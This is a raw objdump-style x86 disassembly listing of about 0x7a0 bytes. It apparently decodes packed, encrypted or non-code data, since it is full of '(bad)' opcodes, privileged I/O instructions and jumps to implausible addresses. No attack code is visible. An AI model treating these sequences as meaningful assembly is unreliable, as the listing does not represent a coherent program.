  41d333:	mov    esi,0xf386de6b
  41d338:	pop    ebx
  41d339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d33a:	lea    esi,[edi+0x70dd9d06]
  41d340:	cmp    edx,edx
  41d342:	sbb    eax,0x5eb4bef1
  41d347:	pop    ds
  41d348:	xchg   ebp,eax
  41d349:	sar    DWORD PTR [edi+0x2085248d],cl
  41d34f:	mov    bl,0xe7
  41d351:	push   edi
  41d352:	or     DWORD PTR [esp+ecx*8+0x2d42c6ce],ebx
  41d359:	hlt    
  41d35a:	dec    esp
  41d35b:	jo     0x41d396
  41d35d:	pop    ds
  41d35e:	ds icebp 
  41d360:	js     0x41d3a2
  41d362:	pop    edx
  41d363:	push   ecx
  41d364:	push   ebx
  41d365:	inc    ecx
  41d366:	dec    eax
  41d367:	lods   eax,DWORD PTR ds:[esi]
  41d368:	push   edi
  41d369:	fwait
  41d36a:	mov    edx,0xf107cb4b
  41d36f:	inc    edx
  41d370:	rcr    BYTE PTR [edi],1
  41d372:	xor    eax,0xff8ebc56
  41d377:	(bad)  
  41d378:	hlt    
  41d379:	xor    ecx,DWORD PTR [ecx+0x52]
  41d37c:	pushf  
  41d37d:	inc    DWORD PTR [edx-0x38f72a52]
  41d383:	(bad)  
  41d385:	add    bh,bl
  41d387:	js     0x41d327
  41d389:	ror    DWORD PTR ds:0x8dc181b0,0x51
  41d390:	neg    BYTE PTR [edi]
  41d392:	xchg   ebx,eax
  41d393:	xchg   esi,eax
  41d394:	loop   0x41d3a8
  41d396:	jle    0x41d3ba
  41d398:	dec    esp
  41d399:	in     eax,0x51
  41d39b:	pop    ebp
  41d39c:	jmp    0x4ab355b9
  41d3a1:	lock cmp ch,0xd2
  41d3a5:	ins    DWORD PTR es:[edi],dx
  41d3a6:	mov    DWORD PTR [edx-0x24],0x686224c3
  41d3ad:	ja     0x41d429
  41d3af:	lahf   
  41d3b0:	xchg   esp,eax
  41d3b1:	jg     0x41d3b0
  41d3b3:	ss xchg ecx,eax
  41d3b5:	int3   
  41d3b6:	lea    eax,[esi]
  41d3b8:	int    0x54
  41d3ba:	int    0xf7
  41d3bc:	mov    ebp,0xae59b7bd
  41d3c1:	lds    ebp,FWORD PTR [esi]
  41d3c3:	xor    DWORD PTR [ecx-0x4f],0xfffffff6
  41d3c7:	daa    
  41d3c8:	push   es
  41d3c9:	mov    eax,ds:0xe398c5ee
  41d3ce:	jnp    0x41d372
  41d3d0:	and    eax,esi
  41d3d2:	inc    edi
  41d3d3:	pop    ebx
  41d3d4:	xchg   edx,eax
  41d3d5:	shr    ebx,0x12
  41d3d8:	iret   
  41d3d9:	rol    ebp,cl
  41d3db:	add    eax,0x35beaba8
  41d3e0:	iret   
  41d3e1:	push   esp
  41d3e2:	adc    ebp,DWORD PTR ds:0x9fd11691
  41d3e8:	mov    al,ds:0x261d7c9f
  41d3ed:	add    BYTE PTR [ecx+0x1f83dc],0xa6
  41d3f4:	sub    eax,0xfffbe93a
  41d3f9:	push   cs
  41d3fa:	stc    
  41d3fb:	enter  0x49af,0x20
  41d3ff:	rol    DWORD PTR [ebx-0x55f116f6],0xd2
  41d406:	scas   al,BYTE PTR es:[edi]
  41d407:	dec    ebp
  41d408:	xchg   ebp,eax
  41d409:	pop    eax
  41d40a:	sbb    DWORD PTR [ebx],edi
  41d40c:	dec    esp
  41d40d:	jno    0x41d3c2
  41d40f:	lods   al,BYTE PTR ds:[esi]
  41d410:	sbb    BYTE PTR [esp+edi*4],ah
  41d413:	mov    eax,DWORD PTR [ecx]
  41d415:	idiv   BYTE PTR [ebx+0x71933901]
  41d41b:	ja     0x41d3d3
  41d41d:	pop    es
  41d41e:	arpl   WORD PTR [edi+0x25528b38],di
  41d424:	mov    WORD PTR [edx+0x497f771f],?
  41d42a:	sub    al,0x5a
  41d42c:	pop    ss
  41d42d:	mov    esi,0xf967465f
  41d432:	jp     0x41d487
  41d434:	xchg   esp,eax
  41d435:	jne    0x41d440
  41d437:	xor    eax,ebx
  41d439:	mov    ebp,0x67c0154d
  41d43e:	(bad)  
  41d440:	test   eax,0xfbc5f0b2
  41d445:	jle    0x41d40e
  41d447:	je     0x41d40e
  41d449:	pushf  
  41d44a:	cmp    ecx,esi
  41d44c:	fsubrp st(4),st
  41d44e:	mov    edx,0x6884f6a7
  41d453:	inc    eax
  41d454:	sub    DWORD PTR [ebx+0x21],0x5f
  41d458:	or     al,0xf8
  41d45a:	out    dx,al
  41d45b:	cmp    al,0x4f
  41d45d:	scas   al,BYTE PTR es:[edi]
  41d45e:	leave  
  41d45f:	and    BYTE PTR [ebx],bl
  41d461:	repz mov al,ds:0x76bd98e5
  41d467:	scas   al,BYTE PTR es:[edi]
  41d468:	inc    esp
  41d469:	dec    esp
  41d46a:	xor    dl,BYTE PTR [esi+0x433d613e]
  41d470:	adc    al,0x36
  41d472:	cs pop ecx
  41d474:	push   ecx
  41d475:	cld    
  41d476:	dec    BYTE PTR [edx-0x7466d9de]
  41d47c:	mov    ch,0x96
  41d47e:	fdiv   st,st(0)
  41d480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d481:	pop    ebx
  41d482:	sar    DWORD PTR [ebp+0x18c6378d],0x2
  41d489:	ins    BYTE PTR es:[edi],dx
  41d48a:	rol    ah,0xd2
  41d48d:	fsub   st,st(3)
  41d48f:	cmp    BYTE PTR [eax-0xf],bh
  41d492:	shl    BYTE PTR [esi],0xd3
  41d495:	mov    ds:0x9862d9b7,al
  41d49a:	test   eax,0x82bcf27
  41d49f:	mov    ebp,0xc74b02f5
  41d4a4:	push   cs
  41d4a5:	imul   esp,DWORD PTR [ebx+0x6b],0xffffffff
  41d4a9:	or     al,0x42
  41d4ab:	inc    ebx
  41d4ac:	fistp  WORD PTR [ebx+0x5be0e4f3]
  41d4b2:	push   es
  41d4b3:	clc    
  41d4b4:	in     al,0xdd
  41d4b6:	add    al,0xe0
  41d4b8:	fistp  QWORD PTR [eax+0x3f603903]
  41d4be:	dec    ebp
  41d4bf:	sub    DWORD PTR [esi+0x69b2c10],esp
  41d4c5:	inc    eax
  41d4c6:	data16 mov bl,0xab
  41d4c9:	ja     0x41d469
  41d4cb:	cmp    cl,BYTE PTR [ebx]
  41d4cd:	(bad)  
  41d4ce:	mov    cl,0x52
  41d4d0:	sbb    BYTE PTR [ecx+0x6d09f0f1],dl
  41d4d6:	repnz enter 0xc581,0x71
  41d4db:	xor    DWORD PTR [edi],ecx
  41d4dd:	fidivr WORD PTR [eax]
  41d4df:	jp     0x41d4b2
  41d4e1:	and    al,0x4
  41d4e3:	pop    ecx
  41d4e4:	inc    ebp
  41d4e5:	scas   eax,DWORD PTR es:[edi]
  41d4e6:	loope  0x41d4c5
  41d4e8:	xchg   edi,eax
  41d4e9:	sbb    ecx,DWORD PTR cs:[edx]
  41d4ec:	(bad)  
  41d4ed:	ja     0x41d51a
  41d4ef:	adc    DWORD PTR [esi-0x76f8d51b],ebx
  41d4f5:	jo     0x41d489
  41d4f7:	sbb    edi,DWORD PTR [ebp+ecx*1-0x20a77fc1]
  41d4fe:	sbb    DWORD PTR [ecx+0x3b6bfbba],ebp
  41d504:	sbb    ch,BYTE PTR [eax-0x2b]
  41d507:	hlt    
  41d508:	mov    ah,0xd1
  41d50a:	fnstenv ds:0x511bfae1
  41d510:	fadd   QWORD PTR [edi-0x4ab9e36f]
  41d516:	or     al,BYTE PTR [esi+eiz*4]
  41d519:	push   esp
  41d51a:	xchg   DWORD PTR [ebp+eiz*1-0x44],edx
  41d51e:	shl    ch,cl
  41d520:	xchg   edi,eax
  41d521:	mov    ebp,DWORD PTR [esi-0x5075cb16]
  41d527:	xchg   ecx,eax
  41d528:	mov    ch,0x8f
  41d52a:	xchg   ebx,eax
  41d52b:	leave  
  41d52c:	fucomip st,st(6)
  41d52e:	imul   ebx,DWORD PTR [esi],0x25
  41d531:	adc    BYTE PTR [esi+edi*4+0x3afb427b],dh
  41d538:	and    edx,esp
  41d53a:	mov    ch,0x33
  41d53c:	enter  0xcd98,0x79
  41d540:	aas    
  41d541:	fcomp  QWORD PTR [ebp+0x60]
  41d544:	cmp    al,ch
  41d546:	les    esi,FWORD PTR [ebx+edx*4-0x45ecd8a9]
  41d54d:	retf   
  41d54e:	daa    
  41d54f:	(bad)  
  41d550:	aam    0x88
  41d552:	xchg   ecx,eax
  41d553:	(bad)  
  41d554:	loopne 0x41d5a3
  41d556:	jae    0x41d5cd
  41d558:	enter  0xdc29,0xc5
  41d55c:	in     eax,0xe1
  41d55e:	pop    ds
  41d55f:	aas    
  41d560:	(bad)  
  41d561:	rcl    BYTE PTR [ebp*4-0xcfbe59a],1
  41d568:	ins    DWORD PTR es:[edi],dx
  41d569:	es xchg ebp,eax
  41d56b:	loope  0x41d537
  41d56d:	mov    esp,0x444a5841
  41d572:	(bad)  
  41d573:	mov    eax,0xc0c004fe
  41d578:	(bad)  
  41d579:	sbb    BYTE PTR ds:0xfd48ac4e,ah
  41d57f:	repz sub bl,BYTE PTR [edi-0x54]
  41d583:	xor    DWORD PTR ds:0x974297b2,0x1c
  41d58a:	lods   al,BYTE PTR ds:[esi]
  41d58b:	fild   DWORD PTR [ecx]
  41d58d:	jb     0x41d5b4
  41d58f:	aad    0x95
  41d591:	cmp    al,0x87
  41d593:	imul   edi,DWORD PTR [ebp-0x42],0xffffffdf
  41d597:	aas    
  41d598:	div    BYTE PTR [edx+ebx*4-0x34]
  41d59c:	mov    edi,edi
  41d59e:	mov    ch,0x7e
  41d5a0:	dec    esp
  41d5a1:	add    DWORD PTR [ebx],ebx
  41d5a3:	add    al,0x44
  41d5a5:	cwde   
  41d5a6:	out    dx,eax
  41d5a7:	ins    BYTE PTR es:[edi],dx
  41d5a8:	data16 cmp bl,BYTE PTR [edi+0x42]
  41d5ac:	inc    eax
  41d5ad:	sar    BYTE PTR [edi+0x60c7eddd],cl
  41d5b3:	sub    eax,0x2acf6eef
  41d5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5b9:	xor    ebx,DWORD PTR [edi]
  41d5bb:	xor    al,0x41
  41d5bd:	imul   eax,DWORD PTR [ebx],0x30
  41d5c0:	push   ebx
  41d5c1:	call   0x43fb89d5
  41d5c6:	jge    0x41d5d8
  41d5c8:	aaa    
  41d5c9:	lahf   
  41d5ca:	and    eax,0x46214d18
  41d5cf:	(bad)  
  41d5d0:	lds    ecx,FWORD PTR [ecx+0x1f19100d]
  41d5d6:	push   esp
  41d5d7:	adc    eax,0x9e55265e
  41d5dc:	dec    esp
  41d5dd:	inc    edi
  41d5de:	icebp  
  41d5df:	les    ebx,FWORD PTR [esi+0x2c]
  41d5e2:	push   cs
  41d5e3:	adc    BYTE PTR [edx+0x44c2773f],al
  41d5e9:	push   ss
  41d5ea:	into   
  41d5eb:	imul   esi,esp,0x4b
  41d5ee:	repnz test BYTE PTR [ecx-0x3b87695],0xc6
  41d5f6:	mov    bl,BYTE PTR [ebx+ebx*8-0x6dbb0d83]
  41d5fd:	jecxz  0x41d642
  41d5ff:	cmp    eax,DWORD PTR [esi-0x769eff9d]
  41d605:	int    0xc0
  41d607:	test   bh,bl
  41d609:	push   cs
  41d60a:	popa   
  41d60b:	xchg   ebx,eax
  41d60c:	pop    ebx
  41d60d:	jle    0x41d620
  41d60f:	and    ch,BYTE PTR [ebp+0x5a604f5e]
  41d615:	cmp    BYTE PTR [eax-0x6b252546],bl
  41d61b:	mov    al,0xc7
  41d61d:	xchg   ecx,eax
  41d61e:	dec    esi
  41d61f:	push   esi
  41d620:	out    0x85,eax
  41d622:	mov    bl,0xad
  41d624:	loopne 0x41d643
  41d626:	pop    esp
  41d627:	inc    eax
  41d628:	and    BYTE PTR [edi],cl
  41d62a:	xchg   DWORD PTR [ebx],esi
  41d62c:	add    eax,0x8b4a0000
  41d631:	push   ebp
  41d632:	cld    
  41d633:	xor    edx,eax
  41d635:	sbb    DWORD PTR ds:0x42a3fd,0x42a3c9
  41d63f:	add    edx,ecx
  41d641:	mov    DWORD PTR ds:0x42a2e1,0x3c09
  41d64b:	jmp    0x422818
  41d650:	jmp    0x41db62
  41d655:	ror    ch,0xd3
  41d658:	rcr    ecx,1
  41d65a:	rol    esi,1
  41d65c:	(bad)  [edi]
  41d65e:	aad    0x6e
  41d660:	stos   BYTE PTR es:[edi],al
  41d661:	pusha  
  41d662:	fldenv [edx+0x7fae82d4]
  41d668:	js     0x41d6dd
  41d66a:	jl     0x41d6e4
  41d66c:	js     0x41d688
  41d66e:	inc    DWORD PTR [edx]
  41d670:	jne    0x41d603
  41d672:	dec    DWORD PTR ds:0xc1536c3b
  41d678:	hlt    
  41d679:	cmc    
  41d67a:	cmp    DWORD PTR [edi-0x62e2f8e3],esi
  41d680:	xor    DWORD PTR ds:0x92fc4889,0x5ec21b61
  41d68a:	nop
  41d68b:	xchg   ebx,eax
  41d68c:	adc    al,0xd1
  41d68e:	jge    0x41d6f4
  41d690:	pop    es
  41d691:	sbb    al,ch
  41d693:	dec    ebp
  41d694:	cs mov ecx,0xfed21135
  41d69a:	scas   al,BYTE PTR es:[edi]
  41d69b:	ja     0x41d6a9
  41d69d:	push   es
  41d69e:	mov    dh,0x9f
  41d6a0:	dec    edi
  41d6a1:	fnstsw WORD PTR [esi]
  41d6a3:	dec    esp
  41d6a4:	xor    edi,ebx
  41d6a6:	mov    cl,ah
  41d6a8:	mov    edx,0xdc02aadc
  41d6ad:	mov    ah,0xbe
  41d6af:	and    BYTE PTR [edx],dl
  41d6b1:	pushf  
  41d6b2:	sbb    eax,0x58d5b0cc
  41d6b7:	xchg   edx,eax
  41d6b8:	jecxz  0x41d670
  41d6ba:	or     BYTE PTR [ebx],cl
  41d6bc:	or     DWORD PTR [eax+0x756a4690],esp
  41d6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6c3:	pop    edx
  41d6c4:	scas   al,BYTE PTR es:[edi]
  41d6c5:	fwait
  41d6c6:	xor    al,0x8b
  41d6c8:	and    BYTE PTR [edx-0x64f98c0b],0xef
  41d6cf:	xchg   ecx,eax
  41d6d0:	mov    ebp,DWORD PTR [ebp-0x7a]
  41d6d3:	push   eax
  41d6d4:	repnz shr BYTE PTR [ebx],cl
  41d6d7:	(bad)  
  41d6d8:	jmp    0xf1ef351
  41d6dd:	add    al,0xa
  41d6df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6e0:	std    
  41d6e1:	jmp    0xcae8ccc4
  41d6e6:	dec    BYTE PTR [edi+0x53]
  41d6e9:	stos   DWORD PTR es:[edi],eax
  41d6ea:	jp     0x41d6c0
  41d6ec:	add    al,0x55
  41d6ee:	cmp    edi,DWORD PTR [ecx]
  41d6f0:	(bad)  
  41d6f1:	lock push edx
  41d6f3:	pop    ecx
  41d6f4:	mov    edx,0x4b9e8642
  41d6f9:	scas   al,BYTE PTR es:[edi]
  41d6fa:	sbb    bh,BYTE PTR [eax-0x5b2fb316]
  41d700:	dec    ebp
  41d701:	lods   al,BYTE PTR ds:[esi]
  41d702:	lock imul esp,DWORD PTR [ebx+0x1366376b],0x52571b71
  41d70d:	mov    bl,0x3f
  41d70f:	dec    esp
  41d710:	leave  
  41d711:	mov    ds:0x101c7dcf,eax
  41d716:	mov    WORD PTR [edi+esi*4+0x2d],?
  41d71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d71b:	sbb    al,0x9a
  41d71d:	and    edi,DWORD PTR cs:[edi]
  41d720:	test   eax,0x5d22abf4
  41d725:	call   0x91aff355
  41d72a:	fst    DWORD PTR [ebx+0x5291e6b4]
  41d730:	icebp  
  41d731:	mov    eax,0xba03d222
  41d736:	push   ecx
  41d737:	mov    eax,0xf92de74e
  41d73c:	fisttp DWORD PTR [eax]
  41d73e:	mov    edx,0xcbbd119f
  41d743:	mov    ds:0x801e897a,eax
  41d748:	add    BYTE PTR [ebx+0x29],dl
  41d74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d74c:	lahf   
  41d74d:	fcomip st,st(4)
  41d74f:	sub    BYTE PTR [ecx-0x2379ec81],dh
  41d755:	sub    esp,DWORD PTR [ebx+eiz*4+0x100e66a0]
  41d75c:	sub    al,0xbb
  41d75e:	pop    edi
  41d75f:	dec    esp
  41d760:	xor    bl,cl
  41d762:	xchg   edx,eax
  41d763:	arpl   WORD PTR [eax+ebx*4],cx
  41d766:	pushf  
  41d767:	clc    
  41d768:	jb     0x41d738
  41d76a:	repz mov cl,0x26
  41d76d:	lds    edx,FWORD PTR [edi]
  41d76f:	cld    
  41d770:	or     DWORD PTR [ebp-0x46],0x78
  41d774:	(bad)  
  41d776:	mov    ds:0x247226f1,eax
  41d77b:	aad    0xf
  41d77d:	mov    dl,0x8f
  41d77f:	push   ecx
  41d780:	jae    0x41d72f
  41d782:	add    al,0xc1
  41d784:	dec    ebx
  41d785:	jp     0x41d747
  41d787:	clc    
  41d788:	cwde   
  41d789:	cmc    
  41d78a:	mov    ch,0x13
  41d78c:	nop
  41d78d:	mov    ch,0xff
  41d78f:	cld    
  41d790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d791:	mov    ds:0xe4e2b355,al
  41d796:	dec    edi
  41d797:	add    ah,ah
  41d799:	in     eax,0x83
  41d79b:	cs pop eax
  41d79d:	push   cs
  41d79e:	add    al,0x30
  41d7a0:	popa   
  41d7a1:	jne    0x41d81a
  41d7a3:	jmp    0x41d81d
  41d7a5:	aas    
  41d7a6:	or     eax,DWORD PTR [edx+0x28]
  41d7a9:	das    
  41d7aa:	inc    ebx
  41d7ab:	stos   DWORD PTR es:[edi],eax
  41d7ac:	sub    al,0xdf
  41d7ae:	loopne 0x41d742
  41d7b0:	outs   dx,BYTE PTR ds:[esi]
  41d7b1:	sbb    esp,edx
  41d7b3:	fwait
  41d7b4:	inc    esp
  41d7b5:	fcomp  QWORD PTR [ebx-0x67aedcae]
  41d7bb:	dec    esp
  41d7bc:	mov    cl,0x84
  41d7be:	pop    ebp
  41d7bf:	push   edx
  41d7c0:	xchg   esp,eax
  41d7c1:	sbb    esp,0x5e1036b4
  41d7c7:	push   cs
  41d7c8:	leave  
  41d7c9:	test   DWORD PTR [eax+edx*8-0x2ada7651],eax
  41d7d0:	mov    bl,0xd9
  41d7d2:	xchg   BYTE PTR [ebx+0x6f98600e],ch
  41d7d8:	sub    eax,0xdce36206
  41d7dd:	xor    al,0x91
  41d7df:	adc    BYTE PTR [edi+0xa80e64f],ch
  41d7e5:	les    esp,FWORD PTR [esp+ecx*8+0x1]
  41d7e9:	pop    ds
  41d7ea:	into   
  41d7eb:	and    BYTE PTR ds:0xc6467359,0x22
  41d7f2:	loop   0x41d7bb
  41d7f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7f5:	int    0x25
  41d7f7:	adc    al,0xca
  41d7f9:	loop   0x41d7f8
  41d7fb:	push   eax
  41d7fc:	mov    ecx,0x7dc3509b
  41d801:	(bad)  
  41d802:	jge    0x41d85c
  41d804:	pminsw mm3,mm1
  41d807:	mov    ah,0x78
  41d809:	gs clc 
  41d80b:	out    0x78,al
  41d80d:	sti    
  41d80e:	cmc    
  41d80f:	bound  edi,QWORD PTR [edx+0x4bfaa172]
  41d815:	xor    eax,0x4b43457e
  41d81a:	cmp    DWORD PTR [ecx],0xffffffa1
  41d81d:	in     eax,0x62
  41d81f:	inc    ebx
  41d820:	sbb    bh,BYTE PTR [esi-0x1f]
  41d823:	gs lahf 
  41d825:	mov    ds:0x515b06b8,eax
  41d82a:	cmp    eax,0x8d74b2e8
  41d82f:	push   ss
  41d830:	adc    al,0x76
  41d832:	sbb    BYTE PTR [ecx-0x79],dl
  41d835:	jmp    0x41d879
  41d837:	or     eax,0xfeeb3ef7
  41d83c:	jg     0x41d807
  41d83e:	push   0xe08fb987
  41d843:	dec    eax
  41d844:	mov    edi,0x1d7a8bb7
  41d849:	cmc    
  41d84a:	ss (bad) 
  41d84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d84d:	cs retf 0x3ec4
  41d851:	in     eax,dx
  41d852:	sbb    edi,DWORD PTR [ecx-0x16d4b596]
  41d858:	inc    esp
  41d859:	mov    ch,0x5e
  41d85b:	mov    al,0x4e
  41d85d:	lods   eax,DWORD PTR ds:[esi]
  41d85e:	(bad)  [esi+eiz*1]
  41d861:	push   cs
  41d862:	and    ch,BYTE PTR [ebx+0x4306bf4]
  41d868:	push   ss
  41d869:	loop   0x41d882
  41d86b:	scas   al,BYTE PTR es:[edi]
  41d86c:	nop
  41d86d:	lds    esi,FWORD PTR [edi+0x717527b4]
  41d873:	lock xor al,0x4e
  41d876:	cmp    BYTE PTR [ebp+0x10],bh
  41d879:	mov    ds:0x85d9737d,al
  41d87e:	jno    0x41d88d
  41d880:	adc    edx,ebp
  41d882:	mov    al,0x60
  41d884:	mov    ebx,0x6fbe68f9
  41d889:	test   DWORD PTR [edx+ebx*8-0x68617deb],eax
  41d890:	pop    ecx
  41d891:	or     al,0x8
  41d893:	dec    ebx
  41d894:	push   0x71
  41d896:	and    edx,DWORD PTR [ebx+edx*8-0x15bb8dae]
  41d89d:	jne    0x41d8d1
  41d89f:	jne    0x41d845
  41d8a1:	and    eax,0x61e2a872
  41d8a6:	lds    esp,FWORD PTR ds:0x9ffd9280
  41d8ac:	push   ebx
  41d8ad:	mov    ecx,0x73a8228a
  41d8b2:	daa    
  41d8b3:	jle    0x41d854
  41d8b5:	xchg   bp,ax
  41d8b7:	icebp  
  41d8b8:	pop    esp
  41d8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8ba:	add    bl,bl
  41d8bc:	and    BYTE PTR [edi+0x34],ah
  41d8bf:	jecxz  0x41d867
  41d8c1:	sub    ebx,edx
  41d8c3:	stc    
  41d8c4:	cli    
  41d8c5:	es call 0xf20e9809
  41d8cb:	popf   
  41d8cc:	dec    esp
  41d8cd:	xchg   esi,eax
  41d8ce:	xchg   ebp,eax
  41d8cf:	aam    0xde
  41d8d1:	sti    
  41d8d2:	fs or  al,0xa9
  41d8d5:	out    0x5,al
  41d8d7:	mov    BYTE PTR [ebx+edi*1-0x1a],cl
  41d8db:	cmp    al,0xbf
  41d8dd:	cmp    al,0x49
  41d8df:	mov    esp,0x56eaba99
  41d8e4:	loope  0x41d8ee
  41d8e6:	jge    0x41d89a
  41d8e8:	push   0xa9b6f935
  41d8ed:	pusha  
  41d8ee:	jg     0x41d94e
  41d8f0:	jmp    0xab7e:0xe9bd492d
  41d8f7:	out    dx,al
  41d8f8:	outs   dx,DWORD PTR ds:[esi]
  41d8f9:	jg     0x41d87b
  41d8fb:	or     DWORD PTR [ebx-0xe],esi
  41d8fe:	xchg   al,dl
  41d900:	cld    
  41d901:	pop    ds
  41d902:	mov    dl,0x2a
  41d904:	pop    esi
  41d905:	shr    DWORD PTR [ecx+0x7e],0x44
  41d909:	scas   eax,DWORD PTR es:[edi]
  41d90a:	test   DWORD PTR [ebx-0x10],ebx
  41d90d:	sti    
  41d90e:	xchg   edi,eax
  41d90f:	sub    DWORD PTR [edx-0x59],esp
  41d912:	xchg   BYTE PTR [ebp+0x73235637],dh
  41d918:	dec    edx
  41d919:	je     0x41d974
  41d91b:	int    0xf9
  41d91d:	sbb    eax,0xc55fd230
  41d922:	xor    BYTE PTR [eax+0x7674af81],0x9a
  41d929:	pop    esp
  41d92a:	sbb    eax,0x5f54ccb5
  41d92f:	imul   esi,DWORD PTR [edx+0x2729b0ef],0xa35d920d
  41d939:	adc    edi,DWORD PTR cs:0x4224313d
  41d940:	cwde   
  41d941:	dec    ebp
  41d942:	repnz mov ah,0xe0
  41d945:	xor    DWORD PTR [edi-0x60a2c8a8],edi
  41d94b:	adc    eax,DWORD PTR [edi]
  41d94d:	inc    ebx
  41d94e:	or     ch,ch
  41d950:	stos   BYTE PTR es:[edi],al
  41d951:	imul   esp,DWORD PTR [esp+ebp*2],0x906659d4
  41d958:	loopne 0x41d9d8
  41d95a:	adc    al,BYTE PTR [ecx+0x26b594a7]
  41d960:	in     eax,dx
  41d961:	and    al,0x96
  41d963:	outs   dx,DWORD PTR ds:[esi]
  41d964:	xchg   edx,eax
  41d965:	inc    ebx
  41d966:	(bad)  
  41d968:	fidivr DWORD PTR [ebp+0x2dc3dff2]
  41d96e:	add    DWORD PTR [ebx-0x5168c6e8],0xd1966952
  41d978:	pop    es
  41d979:	sub    eax,0x1b5fb55b
  41d97e:	xor    eax,0x5a0d8ef3
  41d983:	shl    DWORD PTR [eax+edx*1+0x3c],1
  41d987:	and    ecx,edi
  41d989:	rol    BYTE PTR [edx],cl
  41d98b:	or     DWORD PTR [edx+0x4a],eax
  41d98e:	mov    ds:0x8f6ad16,eax
  41d993:	pop    ss
  41d994:	sub    al,0xee
  41d996:	or     dh,BYTE PTR [eax+0x3bbbbe0b]
  41d99c:	neg    DWORD PTR [edi]
  41d99e:	jle    0x41d98f
  41d9a0:	in     eax,0xc
  41d9a2:	adc    al,BYTE PTR ds:0x42a3f7a3
  41d9a8:	les    esi,FWORD PTR [ebx]
  41d9aa:	gs jno 0xedc7eaf
  41d9b1:	fsubr  DWORD PTR [esi+ebx*8+0x1]
  41d9b5:	jne    0x41d984
  41d9b7:	pushf  
  41d9b8:	out    dx,eax
  41d9b9:	xchg   ebp,eax
  41d9ba:	mov    WORD PTR [ecx],?
  41d9bc:	pop    ebx
  41d9bd:	outs   dx,DWORD PTR ds:[esi]
  41d9be:	add    BYTE PTR [edx+0x2937eec4],al
  41d9c4:	test   DWORD PTR [edx+eax*1-0x28],0x72199505
  41d9cc:	and    al,0xa3
  41d9ce:	rcr    DWORD PTR [eax],cl
  41d9d0:	adc    ecx,DWORD PTR [edx]
  41d9d2:	adc    al,0xf8
  41d9d4:	mul    BYTE PTR [ebp-0x2a4e3c90]
  41d9da:	js     0x41d9ec
  41d9dc:	or     ah,BYTE PTR [esi*2+0x5dd5e2f3]
  41d9e3:	psrad  mm1,QWORD PTR [esi+edx*1+0x7d]
  41d9e8:	inc    esi
  41d9e9:	or     DWORD PTR [ebx-0x5c],edx
  41d9ec:	outs   dx,DWORD PTR ds:[esi]
  41d9ed:	xor    al,0x7a
  41d9ef:	mov    ebp,0x5e75f80b
  41d9f4:	fiadd  WORD PTR [esi-0x2b]
  41d9f7:	bound  ecx,QWORD PTR [edi]
  41d9f9:	rcl    DWORD PTR [edx+eax*2],cl
  41d9fc:	ret    0x96
  41d9ff:	into   
  41da00:	inc    edx
  41da01:	or     edx,ebx
  41da03:	mov    dl,0x46
  41da05:	push   eax
  41da06:	shl    DWORD PTR [ebx-0x3a],1
  41da09:	or     eax,0xcf56da27
  41da0e:	into   
  41da0f:	add    DWORD PTR [ecx-0x29a4254f],ecx
  41da15:	push   ecx
  41da16:	xor    cl,ch
  41da18:	in     eax,0xf0
  41da1a:	ret    0x747a
  41da1d:	sbb    eax,0x668ee5cf
  41da22:	xchg   esi,eax
  41da23:	addr16 push esp
  41da25:	lea    edi,[ecx]
  41da27:	sbb    BYTE PTR [eax],dh
  41da29:	add    eax,0xb6b735d3
  41da2e:	cmp    dl,BYTE PTR [edi+0xf]
  41da31:	add    ecx,DWORD PTR [ebx+0x74ec7fab]
  41da37:	cli    
  41da38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da39:	sbb    al,0x86
  41da3b:	pushf  
  41da3c:	sub    ecx,DWORD PTR fs:[ecx+0x2f]
  41da40:	xchg   ebx,eax
  41da41:	mov    esp,0x1721cfee
  41da46:	pop    edx
  41da47:	xor    al,0x84
  41da49:	or     bh,BYTE PTR [eax-0x3533ff57]
  41da4f:	shl    DWORD PTR [ebx],1
  41da51:	push   esi
  41da52:	int    0x67
  41da54:	(bad)  [esi+eax*1]
  41da57:	sar    BYTE PTR [ecx],0x57
  41da5a:	stos   DWORD PTR es:[edi],eax
  41da5b:	push   cs
  41da5c:	int3   
  41da5d:	sub    BYTE PTR [ecx+0x44ea5f1b],dl
  41da63:	out    dx,eax
  41da64:	aaa    
  41da65:	push   edi
  41da66:	fst    DWORD PTR [esi+eiz*8-0x3d03aaa7]
  41da6d:	adc    BYTE PTR [ebx-0x22],cl
  41da70:	(bad)  
  41da71:	push   esp
  41da72:	ficom  WORD PTR [ebx+ebx*4]
  41da75:	jb     0x41dac2
  41da77:	dec    edi
  41da78:	add    ecx,esp
  41da7a:	pop    es
  41da7b:	sbb    al,0x7d
  41da7d:	pop    eax
  41da7e:	mov    ds:0xef39ef6d,al
  41da83:	and    DWORD PTR [ecx],0x4259fdd1
  41da89:	xchg   BYTE PTR [ebx],al
  41da8b:	push   eax
  41da8c:	jecxz  0x41dae1
  41da8e:	je     0x41da6e
  41da90:	or     BYTE PTR [ebp-0x24e54194],dh
  41da96:	out    0x2,eax
  41da98:	cmp    eax,0x12efd7d1
  41da9d:	ret    0xa4ee
  41daa0:	pop    esp
  41daa1:	jbe    0x41db1f
  41daa3:	xchg   DWORD PTR [ebp-0xa936e31],esp
  41daa9:	shl    ecx,1
  41daab:	into   
  41daac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daad:	fs retf 0xb68d
  41dab1:	retf   
  41dab2:	clc    
  41dab3:	mov    ds:0xda8bf397,al
  41dab8:	daa    
  41dab9:	ficom  WORD PTR [edi-0x6c3d1eff]
  41dabf:	lahf   
  41dac0:	in     al,0x6f
  41dac2:	fldenv [eax+ebp*8]
  41dac5:	lahf   
  41dac6:	or     dl,bl
  41dac8:	inc    eax
  41dac9:	stos   DWORD PTR es:[edi],eax
  41daca:	adc    esi,DWORD PTR [edi+eax*1-0x4e]
  41dace:	and    bh,BYTE PTR [edx-0x46]
  41dad1:	pop    ebp
